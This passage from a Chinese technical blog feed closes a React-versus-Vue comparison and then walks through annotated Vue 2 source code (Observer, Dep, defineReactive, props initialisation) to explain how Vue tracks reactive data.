<h3 id="5-2-Vue视图渲染"><a href="#5-2-Vue视图渲染" class="headerlink" title="5.2 Vue视图渲染"></a>5.2 <code>Vue</code>视图渲染</h3><ul>
<li><p><code>Vue</code> 通过建立一个虚拟 <code>DOM</code> 对真实 <code>DOM</code> 发生的变化保持追踪。</p>
</li>
<li><p><code>Vue</code>渲染的过程如下：</p>
<ul>
<li><code>new Vue</code>，执行初始化</li>
<li>挂载<code>$mount</code>方法，通过自定义<code>Render</code>方法、<code>template、el</code>等生成<code>Render</code>函数</li>
<li>通过Watcher监听数据的变化</li>
<li>当数据发生变化时，<code>Render</code>函数执行生成<code>VNode</code>对象</li>
<li>通过<code>patch</code>方法，对比新旧<code>VNode</code>对象，通过<code>DOM Diff</code>算法，添加、修改、删除真正的<code>DOM</code>元素</li>
</ul>
</li>
</ul>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总结一下，我们发现，</p>
<h3 id="Vue的优势包括："><a href="#Vue的优势包括：" class="headerlink" title="Vue的优势包括："></a><code>Vue</code>的优势包括：</h3><ul>
<li>模板和渲染函数的弹性选择</li>
<li>简单的语法及项目创建</li>
<li>更快的渲染速度和更小的体积<h3 id="React的优势包括："><a href="#React的优势包括：" class="headerlink" title="React的优势包括："></a><code>React</code>的优势包括：</h3></li>
<li>更适用于大型应用和更好的可测试性</li>
<li>同时适用于Web端和原生App</li>
<li>更大的生态圈带来的更多支持和工具</li>
</ul>
<h4 id="而实际上，React和Vue都是非常优秀的框架，它们之间的相似之处多过不同之处，并且它们大部分最棒的功能是相通的："><a href="#而实际上，React和Vue都是非常优秀的框架，它们之间的相似之处多过不同之处，并且它们大部分最棒的功能是相通的：" class="headerlink" title="而实际上，React和Vue都是非常优秀的框架，它们之间的相似之处多过不同之处，并且它们大部分最棒的功能是相通的："></a>而实际上，<code>React</code>和<code>Vue</code>都是非常优秀的框架，它们之间的相似之处多过不同之处，并且它们大部分最棒的功能是相通的：</h4><ul>
<li>利用虚拟<code>DOM</code>实现快速渲染</li>
<li>轻量级</li>
<li>响应式和组件化</li>
<li>服务器端渲染</li>
<li>易于集成路由工具，打包工具以及状态管理工具</li>
<li>优秀的支持和社区</li>
</ul>
]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
        <tag>不同技术栈</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue_vue数据监听原理</title>
    <url>/2018/04/17/Vue_vue%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>首先让我们从最简单的一个实例<code>Vue</code>入手:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="comment">// options  传入一个选项obj.这个obj即对于这个vue实例的初始化</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>通过查阅文档，我们可以知道这个<code>options</code>可以接受:</p>
<ul>
<li>选项/数据<ul>
<li>data</li>
<li>props</li>
<li>propsData(方便测试使用)</li>
<li>computed</li>
<li>methods</li>
<li>watch</li>
</ul>
</li>
<li>选项 / DOM</li>
<li>选项 / 生命周期钩子</li>
<li>选项 / 资源</li>
<li>选项 / 杂项</li>
</ul>
<p>具体未展开的内容请自行查阅相关文档，接下来让我们来看看传入的<code>选项/数据</code>是如何管理数据之间的相互依赖的。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">'#app'</span>,</span><br><span class="line">    props: &#123;</span><br><span class="line">      a: &#123;</span><br><span class="line">        type: <span class="built_in">Object</span>,</span><br><span class="line">        <span class="keyword">default</span> () &#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            key1: <span class="string">'a'</span>,</span><br><span class="line">            key2: &#123;</span><br><span class="line">                a: <span class="string">'b'</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data: &#123;</span><br><span class="line">      msg1: <span class="string">'Hello world!'</span>,</span><br><span class="line">      arr: &#123;</span><br><span class="line">        arr1: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    watch: &#123;</span><br><span class="line">      a (newVal, oldVal) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(newVal, oldVal)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      go () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'This is simple demo'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>我们使用<code>Vue</code>这个构造函数去实例化了一个<code>vue</code>实例<code>app</code>。传入了<code>props</code>, <code>data</code>, <code>watch</code>, <code>methods</code>等属性。在实例化的过程中，<code>Vue</code>提供的构造函数就使用我们传入的<code>options</code>去完成数据的依赖管理，初始化的过程只有一次，但是在你自己的程序当中，数据的依赖管理的次数不止一次。</p>
<p>那<code>Vue</code>的构造函数到底是怎么实现的呢？ <a href="https://github.com/vuejs/vue/blob/v2.1.10/src/core/instance/index.js" target="_blank" rel="noopener">Vue</a><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vue</span> (<span class="params">options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span> &amp;&amp;</span><br><span class="line">    !(<span class="keyword">this</span> <span class="keyword">instanceof</span> Vue)) &#123;</span><br><span class="line">    warn(<span class="string">'Vue is a constructor and should be called with the `new` keyword'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">this</span>._init(options)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对Vue这个class进行mixin,即在原型上添加方法</span></span><br><span class="line"><span class="comment">// Vue.prototype.* = function () &#123;&#125;</span></span><br><span class="line">initMixin(Vue)</span><br><span class="line">stateMixin(Vue)</span><br><span class="line">eventsMixin(Vue)</span><br><span class="line">lifecycleMixin(Vue)</span><br><span class="line">renderMixin(Vue)</span><br></pre></td></tr></table></figure></p>
<p>当我们调用<code>new Vue</code>的时候，事实上就调用的<code>Vue</code>原型上的<code>_init</code>方法.<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 原型上提供_init方法,新建一个vue实例并传入options参数</span></span><br><span class="line">Vue.prototype._init = <span class="function"><span class="keyword">function</span> (<span class="params">options?: Object</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> vm: Component = <span class="keyword">this</span></span><br><span class="line">    <span class="comment">// a uid</span></span><br><span class="line">    vm._uid = uid++</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> startTag, endTag</span><br><span class="line">    <span class="comment">// a flag to avoid this being observed</span></span><br><span class="line">    vm._isVue = <span class="literal">true</span></span><br><span class="line">    <span class="comment">// merge options</span></span><br><span class="line">    <span class="keyword">if</span> (options &amp;&amp; options._isComponent) &#123;</span><br><span class="line">      <span class="comment">// optimize internal component instantiation</span></span><br><span class="line">      <span class="comment">// since dynamic options merging is pretty slow, and none of the</span></span><br><span class="line">      <span class="comment">// internal component options needs special treatment.</span></span><br><span class="line">      initInternalComponent(vm, options)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 将传入的这些options选项挂载到vm.$options属性上</span></span><br><span class="line">      vm.$options = mergeOptions(</span><br><span class="line">        <span class="comment">// components/filter/directive</span></span><br><span class="line">        resolveConstructorOptions(vm.constructor),</span><br><span class="line">        <span class="comment">// this._init()传入的options</span></span><br><span class="line">        options || &#123;&#125;,</span><br><span class="line">        vm</span><br><span class="line">      )</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* istanbul ignore else */</span></span><br><span class="line">    <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span>) &#123;</span><br><span class="line">      initProxy(vm)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      vm._renderProxy = vm</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// expose real self</span></span><br><span class="line">    vm._self = vm     <span class="comment">// 自身的实例</span></span><br><span class="line">    <span class="comment">// 接下来所有的操作都是在这个实例上添加方法</span></span><br><span class="line">    initLifecycle(vm)  <span class="comment">// lifecycle初始化</span></span><br><span class="line">    initEvents(vm)     <span class="comment">// events初始化 vm._events, 主要是提供vm实例上的$on/$emit/$off/$off等方法</span></span><br><span class="line">    initRender(vm)     <span class="comment">// 初始化渲染函数,在vm上绑定$createElement方法</span></span><br><span class="line">    callHook(vm, <span class="string">'beforeCreate'</span>)  <span class="comment">// 钩子函数的执行, beforeCreate</span></span><br><span class="line">    initInjections(vm) <span class="comment">// resolve injections before data/props</span></span><br><span class="line">    initState(vm)      <span class="comment">// Observe data添加对data的监听, 将data转化为getters/setters</span></span><br><span class="line">    initProvide(vm) <span class="comment">// resolve provide after data/props</span></span><br><span class="line">    callHook(vm, <span class="string">'created'</span>) <span class="comment">// 钩子函数的执行, created</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// vm挂载的根元素</span></span><br><span class="line">    <span class="keyword">if</span> (vm.$options.el) &#123;</span><br><span class="line">      vm.$mount(vm.$options.el)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中在<code>this._init()</code>方法中调用<code>initState(vm)</code>,完成对<code>vm</code>这个实例的数据的监听,也是本文所要展开说的具体内容。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">initState</span> (<span class="params">vm: Component</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 首先在vm上初始化一个_watchers数组，缓存这个vm上的所有watcher</span></span><br><span class="line">  vm._watchers = []</span><br><span class="line">  <span class="comment">// 获取options,包括在new Vue传入的，同时还包括了Vue所继承的options</span></span><br><span class="line">  <span class="keyword">const</span> opts = vm.$options</span><br><span class="line">  <span class="comment">// 初始化props属性</span></span><br><span class="line">  <span class="keyword">if</span> (opts.props) initProps(vm, opts.props)</span><br><span class="line">  <span class="comment">// 初始化methods属性</span></span><br><span class="line">  <span class="keyword">if</span> (opts.methods) initMethods(vm, opts.methods)</span><br><span class="line">  <span class="comment">// 初始化data属性</span></span><br><span class="line">  <span class="keyword">if</span> (opts.data) &#123;</span><br><span class="line">    initData(vm)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    observe(vm._data = &#123;&#125;, <span class="literal">true</span> <span class="comment">/* asRootData */</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 初始化computed属性</span></span><br><span class="line">  <span class="keyword">if</span> (opts.computed) initComputed(vm, opts.computed)</span><br><span class="line">  <span class="comment">// 初始化watch属性</span></span><br><span class="line">  <span class="keyword">if</span> (opts.watch) initWatch(vm, opts.watch)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="initProps"><a href="#initProps" class="headerlink" title="initProps"></a>initProps</h3><p>我们在实例化<code>app</code>的时候，在构造函数里面传入的<code>options</code>中有<code>props</code>属性：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    type: <span class="built_in">Object</span>,</span><br><span class="line">    <span class="keyword">default</span> () &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        key1: <span class="string">'a'</span>,</span><br><span class="line">        key2: &#123;</span><br><span class="line">            a: <span class="string">'b'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initProps</span> (<span class="params">vm: Component, propsOptions: Object</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// propsData主要是为了方便测试使用</span></span><br><span class="line">  <span class="keyword">const</span> propsData = vm.$options.propsData || &#123;&#125;</span><br><span class="line">  <span class="comment">// 新建vm._props对象，可以通过app实例去访问</span></span><br><span class="line">  <span class="keyword">const</span> props = vm._props = &#123;&#125;</span><br><span class="line">  <span class="comment">// cache prop keys so that future props updates can iterate using Array</span></span><br><span class="line">  <span class="comment">// instead of dynamic object key enumeration.</span></span><br><span class="line">  <span class="comment">// 缓存的prop key</span></span><br><span class="line">  <span class="keyword">const</span> keys = vm.$options._propKeys = []</span><br><span class="line">  <span class="keyword">const</span> isRoot = !vm.$parent</span><br><span class="line">  <span class="comment">// root instance props should be converted</span></span><br><span class="line">  observerState.shouldConvert = isRoot</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> propsOptions) &#123;</span><br><span class="line">    <span class="comment">// this._init传入的options中的props属性</span></span><br><span class="line">    keys.push(key)</span><br><span class="line">    <span class="comment">// 注意这个validateProp方法，不仅完成了prop属性类型验证的，同时将prop的值都转化为了getter/setter,并返回一个observer</span></span><br><span class="line">    <span class="keyword">const</span> value = validateProp(key, propsOptions, propsData, vm)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将这个key对应的值转化为getter/setter</span></span><br><span class="line">      defineReactive(props, key, value)</span><br><span class="line">    <span class="comment">// static props are already proxied on the component's prototype</span></span><br><span class="line">    <span class="comment">// during Vue.extend(). We only need to proxy props defined at</span></span><br><span class="line">    <span class="comment">// instantiation here.</span></span><br><span class="line">    <span class="comment">// 如果在vm这个实例上没有key属性，那么就通过proxy转化为proxyGetter/proxySetter, 并挂载到vm实例上，可以通过app._props[key]这种形式去访问</span></span><br><span class="line">    <span class="keyword">if</span> (!(key <span class="keyword">in</span> vm)) &#123;</span><br><span class="line">      proxy(vm, <span class="string">`_props`</span>, key)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  observerState.shouldConvert = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来看下<code>validateProp(key, propsOptions, propsData, vm)</code>方法内部到底发生了什么。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">validateProp</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  key: string,</span></span></span><br><span class="line"><span class="function"><span class="params">  propOptions: Object,    <span class="regexp">//</span> $options.props属性</span></span></span><br><span class="line"><span class="function"><span class="params">  propsData: Object,      <span class="regexp">//</span> $options.propsData属性</span></span></span><br><span class="line"><span class="function"><span class="params">  vm?: Component</span></span></span><br><span class="line"><span class="function"><span class="params"></span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> prop = propOptions[key]</span><br><span class="line">  <span class="comment">// 如果在propsData测试props上没有缓存的key</span></span><br><span class="line">  <span class="keyword">const</span> absent = !hasOwn(propsData, key)</span><br><span class="line">  <span class="keyword">let</span> value = propsData[key]</span><br><span class="line">  <span class="comment">// 处理boolean类型的数据</span></span><br><span class="line">  <span class="comment">// handle boolean props</span></span><br><span class="line">  <span class="keyword">if</span> (isType(<span class="built_in">Boolean</span>, prop.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (absent &amp;&amp; !hasOwn(prop, <span class="string">'default'</span>)) &#123;</span><br><span class="line">      value = <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isType(<span class="built_in">String</span>, prop.type) &amp;&amp; (value === <span class="string">''</span> || value === hyphenate(key))) &#123;</span><br><span class="line">      value = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// check default value</span></span><br><span class="line">  <span class="keyword">if</span> (value === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="comment">// default属性值，是基本类型还是function</span></span><br><span class="line">    <span class="comment">// getPropsDefaultValue见下面第一段代码</span></span><br><span class="line">    value = getPropDefaultValue(vm, prop, key)</span><br><span class="line">    <span class="comment">// since the default value is a fresh copy,</span></span><br><span class="line">    <span class="comment">// make sure to observe it.</span></span><br><span class="line">    <span class="keyword">const</span> prevShouldConvert = observerState.shouldConvert</span><br><span class="line">    observerState.shouldConvert = <span class="literal">true</span></span><br><span class="line">    <span class="comment">// 将value的所有属性转化为getter/setter形式</span></span><br><span class="line">    <span class="comment">// 并添加value的依赖</span></span><br><span class="line">    <span class="comment">// observe方法的分析见下面第二段代码</span></span><br><span class="line">    observe(value)</span><br><span class="line">    observerState.shouldConvert = prevShouldConvert</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (process.env.NODE_ENV !== <span class="string">'production'</span>) &#123;</span><br><span class="line">    assertProp(prop, key, value, vm, absent)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> value</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取prop的默认值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPropDefaultValue</span> (<span class="params">vm: ?Component, prop: PropOptions, key: string</span>): <span class="title">any</span> </span>&#123;</span><br><span class="line">  <span class="comment">// no default, return undefined</span></span><br><span class="line">  <span class="comment">// 如果没有default属性的话，那么就返回undefined</span></span><br><span class="line">  <span class="keyword">if</span> (!hasOwn(prop, <span class="string">'default'</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> def = prop.default</span><br><span class="line">  <span class="comment">// the raw prop value was also undefined from previous render,</span></span><br><span class="line">  <span class="comment">// return previous default value to avoid unnecessary watcher trigger</span></span><br><span class="line">  <span class="keyword">if</span> (vm &amp;&amp; vm.$options.propsData &amp;&amp;</span><br><span class="line">    vm.$options.propsData[key] === <span class="literal">undefined</span> &amp;&amp;</span><br><span class="line">    vm._props[key] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> vm._props[key]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// call factory function for non-Function types</span></span><br><span class="line">  <span class="comment">// a value is Function if its prototype is function even across different execution context</span></span><br><span class="line">  <span class="comment">// 如果是function 则调用def.call(vm)</span></span><br><span class="line">  <span class="comment">// 否则就返回default属性对应的值</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> def === <span class="string">'function'</span> &amp;&amp; getType(prop.type) !== <span class="string">'Function'</span></span><br><span class="line">    ? def.call(vm)</span><br><span class="line">    : def</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Vue</code>提供了一个<code>observe</code>方法,在其内部实例化了一个<code>Observer</code>类，并返回<code>Observer</code>的实例。每一个<code>Observer</code>实例对应记录了<code>props</code>中这个的<code>default value</code>的所有依赖(仅限<code>object</code>类型)，这个<code>Observer</code>实际上就是一个主题，它维护了一个数组<code>this.subs = []</code>用以收集相关的<code>subs(观察者)(即这个主题的依赖)</code>。通过将<code>default value</code>转化为<code>getter/setter</code>形式，同时添加一个自定义<code>__ob__</code>属性，这个属性就对应<code>Observer</code>实例。</p>
<p>说起来有点绕，还是让我们看看我们给的<code>demo</code>里传入的<code>options</code>配置:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    type: <span class="built_in">Object</span>,</span><br><span class="line">    <span class="keyword">default</span> () &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        key1: <span class="string">'a'</span>,</span><br><span class="line">        key2: &#123;</span><br><span class="line">            a: <span class="string">'b'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在往上数的第二段代码里面的方法<code>obervse(value)</code>，即对<code>{key1: &#39;a&#39;, key2: {a: &#39;b&#39;}}</code>进行依赖的管理，同时将这个obj所有的属性值都转化为<code>getter/setter</code>形式。此外，<code>Vue</code>还会将<code>props</code>属性都代理到vm实例上，通过<code>vm.key1,vm.key2</code>就可以访问到这个属性。</p>
<p>此外，还需要了解下在<code>Vue</code>中管理依赖的一个非常重要的类: <code>Dep</code><br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> () &#123;</span><br><span class="line">    <span class="keyword">this</span>.id = uid++</span><br><span class="line">    <span class="keyword">this</span>.subs = []</span><br><span class="line">  &#125;</span><br><span class="line">  addSub () &#123;...&#125;  <span class="comment">// 添加观察者(依赖)</span></span><br><span class="line">  removeSub () &#123;...&#125;  <span class="comment">// 删除观察者(依赖)</span></span><br><span class="line">  depend () &#123;...&#125;  <span class="comment">// 检查当前Dep.target是否存在以及判断这个watcher已经被添加到了相应的依赖当中，如果没有则添加观察者(依赖)，如果已经被添加了那么就不做处理</span></span><br><span class="line">  notify () &#123;...&#125;  <span class="comment">// 通知观察者(依赖)更新</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在<code>Vue</code>的整个生命周期当中，你所定义的响应式的数据上都会绑定一个<code>Dep</code>实例去管理其依赖。它实际上就是主题和观察者联系的一个桥梁。</p>
<p>刚才谈到了对于依赖的管理，它的核心之一就是主题类<code>Observer</code>这个类：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  value: any;</span><br><span class="line">  dep: Dep;</span><br><span class="line">  vmCount: number; <span class="comment">// number of vms that has this object as root $data</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span> (value: any) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value</span><br><span class="line">    <span class="comment">// dep记录了和这个value值的相关依赖</span></span><br><span class="line">    <span class="keyword">this</span>.dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">this</span>.vmCount = <span class="number">0</span></span><br><span class="line">    <span class="comment">// value其实就是vm._data, 即在vm._data上添加__ob__属性</span></span><br><span class="line">    def(value, <span class="string">'__ob__'</span>, <span class="keyword">this</span>)</span><br><span class="line">    <span class="comment">// 如果是数组</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      <span class="comment">// 首先判断是否能使用__proto__属性</span></span><br><span class="line">      <span class="keyword">const</span> augment = hasProto</span><br><span class="line">        ? protoAugment</span><br><span class="line">        : copyAugment</span><br><span class="line">      augment(value, arrayMethods, arrayKeys)</span><br><span class="line">      <span class="comment">// 遍历数组，并将obj类型的属性改为getter/setter实现</span></span><br><span class="line">      <span class="keyword">this</span>.observeArray(value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 遍历obj上的属性，将每个属性改为getter/setter实现</span></span><br><span class="line">      <span class="keyword">this</span>.walk(value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Walk through each property and convert them into</span></span><br><span class="line"><span class="comment">   * getter/setters. This method should only be called when</span></span><br><span class="line"><span class="comment">   * value type is Object.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">// 将每个property对应的属性都转化为getter/setters,只能是当这个value的类型为Object时</span></span><br><span class="line">  walk (obj: <span class="built_in">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">      defineReactive(obj, keys[i], obj[keys[i]])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Observe a list of Array items.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="comment">// 监听array中的item</span></span><br><span class="line">  observeArray (items: <span class="built_in">Array</span>&lt;any&gt;) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, l = items.length; i &lt; l; i++) &#123;</span><br><span class="line">      observe(items[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>walk</code>方法里面调用<code>defineReactive</code>方法：通过遍历这个<code>object</code>的<code>key</code>，并将对应的<code>value</code>转化为<code>getter/setter</code>形式，通过闭包维护一个<code>dep</code>，在<code>getter</code>方法当中定义了这个<code>key</code>是如何进行依赖的收集，在<code>setter</code>方法中定义了当这个<code>key</code>对应的值改变后，如何完成相关依赖数据的更新。但是从源码当中，我们却发现当<code>getter</code>函数被调用的时候并非就一定会完成依赖的收集，其中还有一层判断，就是<code>Dep.target</code>是否存在。<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define a reactive property on an Object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  obj: Object,</span></span></span><br><span class="line"><span class="function"><span class="params">  key: string,</span></span></span><br><span class="line"><span class="function"><span class="params">  val: any,</span></span></span><br><span class="line"><span class="function"><span class="params">  customSetter?: Function</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 每个属性新建一个dep实例，管理这个属性的依赖</span></span><br><span class="line">  <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 或者属性描述符</span></span><br><span class="line">  <span class="keyword">const</span> property = <span class="built_in">Object</span>.getOwnPropertyDescriptor(obj, key)</span><br><span class="line">  <span class="comment">// 如果这个属性是不可配的，即无法更改</span></span><br><span class="line">  <span class="keyword">if</span> (property &amp;&amp; property.configurable === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// cater for pre-defined getter/setters</span></span><br><span class="line">  <span class="keyword">const</span> getter = property &amp;&amp; property.get</span><br><span class="line">  <span class="keyword">const</span> setter = property &amp;&amp; property.set</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 递归去将val转化为getter/setter</span></span><br><span class="line">  <span class="comment">// childOb将子属性也转化为Observer</span></span><br><span class="line">  <span class="keyword">let</span> childOb = observe(val)</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    <span class="comment">// 定义getter --&gt;&gt; reactiveGetter</span></span><br><span class="line">    <span class="keyword">get</span>: function reactiveGetter () &#123;</span><br><span class="line">      <span class="keyword">const</span> value = getter ? getter.call(obj) : val</span><br><span class="line">      <span class="comment">// 定义相应的依赖</span></span><br><span class="line">      <span class="keyword">if</span> (Dep.target) &#123;</span><br><span class="line">        <span class="comment">// Dep.target.addDep(this)</span></span><br><span class="line">        <span class="comment">// 即添加watch函数</span></span><br><span class="line">        <span class="comment">// dep.depend()及调用了dep.addSub()只不过中间需要判断是否这个id的dep已经被包含在内了</span></span><br><span class="line">        dep.depend()</span><br><span class="line">        <span class="comment">// childOb也添加依赖</span></span><br><span class="line">        <span class="keyword">if</span> (childOb) &#123;</span><br><span class="line">          childOb.dep.depend()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">          dependArray(value)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> value</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 定义setter --&gt;&gt; reactiveSetter</span></span><br><span class="line">    <span class="keyword">set</span>: function reactiveSetter (newVal) &#123;</span><br><span class="line">      <span class="keyword">const</span> value = getter ? getter.call(obj) : val</span><br><span class="line">      <span class="comment">/* eslint-disable no-self-compare */</span></span><br><span class="line">      <span class="keyword">if</span> (newVal === value || (newVal !== newVal &amp;&amp; value !== value)) &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (setter) &#123;</span><br><span class="line">        setter.call(obj, newVal)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        val = newVal</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对得到的新值进行observe</span></span><br><span class="line">      childOb = observe(newVal)</span><br><span class="line">      <span class="comment">// 相应的依赖进行更新</span></span><br><span class="line">      dep.notify()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
